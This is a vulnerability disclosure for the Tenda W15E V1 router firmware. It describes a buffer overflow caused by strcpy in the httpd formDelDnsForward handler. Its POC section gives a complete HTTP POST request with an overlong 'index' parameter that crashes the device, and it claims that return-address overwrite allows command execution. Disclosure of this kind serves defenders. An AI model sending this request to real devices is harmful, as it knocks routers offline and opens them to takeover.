Tenda W15E V1 A vulnerability of buffer overflow exists，This vulnerability is the same as CVE-2022-45721！

V15.11.0.14

Download
https://www.tenda.com.cn/download/detail-2722.html

`httpd`  file.

![image](https://user-images.githubusercontent.com/76503635/219377164-88982477-268d-47b9-91e3-b725d487c628.png)

No filtering has been applied to the picName parameter，Buffer overflow vulnerability caused by sprintf function.

## Tenda V15EV1.0 found a buffer overflow vulnerability in the "index" parameter of the "formDelDnsForward" function

### Vendor:

​	Tenda

### Product:

​	V15EV1.0

### Vendor Homepage:

​	https://www.tenda.com.cn/

### Firmware:

​	https://www.tenda.com.cn/download/detail-2722.html

### Version:

​	V15.11.0.14(1521_3190_1058)

## Vulnerability details

The vulnerability is in the `"formDelDnsForward"` function in the `/bin/httpd` file

​	[Pic]

`"indexSet"` receives the transmitted parameters, does not verify its length. causes a buffer overflow vulnerability due to the use of `strcpy()`

## POC

```http
POST /goform/delDNSForward HTTP/1.1
Host: 192.168.75.201
Content-Length: 85
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.75.201
Referer: http://192.168.75.201/quickset/quickset.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: W15E_user=
Connection: close

index=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

[Pic]

Denial of service caused by sending the request

[Pic]

And overwrite the return address, an execute arbitrary commands by constructing EXP
